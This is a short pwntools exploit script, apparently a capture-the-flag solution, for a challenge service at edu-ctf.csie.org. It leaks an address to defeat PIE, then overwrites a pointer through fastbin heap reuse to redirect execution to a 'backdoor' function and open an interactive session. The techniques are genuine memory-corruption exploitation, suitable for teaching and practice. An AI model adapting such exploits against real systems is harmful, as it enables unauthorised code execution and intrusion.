from pwn import *

context(log_level='debug')

# PIE
bye_off = 0xa77
backdoor_off = 0xab5

#  r = remote('localhost', 1111)
r = remote('edu-ctf.csie.org', 10177)
pause()
r.sendlineafter('Size of your message: ', str(0x10)) # to attain 0x20 fastbin: size <= 0x10
r.sendlineafter('Message: ', 'a' * 7)
r.recvuntil('Saved message: aaaaaaa\n')
bye_addr = u64(r.recv(6) + b'\0' * 2)
success(hex(bye_addr))

r.sendlineafter('Size of your message: ', '100')
r.sendlineafter('Message: ', '')

r.sendlineafter('Size of your message: ', str(0x10))
r.sendlineafter('Message: ', b'a' * 8 + p64( bye_addr - bye_off + backdoor_off ))
r.interactive()
